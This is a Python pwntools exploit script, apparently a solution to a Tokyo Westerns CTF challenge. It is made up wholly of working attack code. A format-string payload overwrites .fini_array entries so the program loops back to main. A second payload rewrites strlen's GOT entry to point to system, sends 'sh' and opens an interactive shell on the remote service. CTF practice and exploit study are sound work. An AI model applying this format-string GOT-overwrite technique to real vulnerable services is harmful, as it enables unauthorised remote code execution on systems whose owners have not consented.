#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#port = 8888
host = "pwn2.chal.ctf.westerns.tokyo"
port = 16317


r = remote(host,port)

fini1 = 0x8049950
fini2 = 0x8049934
main = 0x080485ed
system = 0x8048490
#system = 0x41414141
strlen_got = 0x8049a54
r.recvuntil("name...")
payload = "aa"
payload += p32(fini1)
payload += p32(fini2)
payload += fmtchar(10+18,main & 0xffff,12,2)
payload += fmtchar(main & 0xffff,main & 0xffff,13,2)
r.sendline(payload)

r.recvuntil("name...")

payload = "aa"
payload += p32(strlen_got)
payload += p32(strlen_got+2)
payload += fmtchar(10+18,system & 0xffff,12,2)
payload += fmtchar(system & 0xffff,(system >> 16),13,2)
r.sendline(payload)

r.recvuntil("name...")
r.sendline("sh")
r.interactive()

